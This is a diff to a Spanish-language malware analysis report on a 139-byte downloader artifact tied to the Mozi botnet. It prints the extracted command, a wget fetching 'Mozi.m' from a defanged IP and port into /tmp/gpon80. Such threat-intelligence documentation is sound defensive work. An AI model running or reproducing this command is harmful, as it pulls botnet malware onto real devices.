@@ -4,7 +4,9 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with no line terminators de 139 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://202.70.139.XXX:38564/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 139 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://202.70.139.XXX:38564/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `wget hxxp://202.70.139.XXX:38564/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/ba4822fb2a8cf9768c6ebde969c2d818808adb8388d91a301e65fbf2cf732bd8.md](../../../../../malware-like/oraculo/downloader/ba4822fb2a8cf9768c6ebde969c2d818808adb8388d91a301e65fbf2cf732bd8.md)
 
 
 ## 🏷️ Clasificación
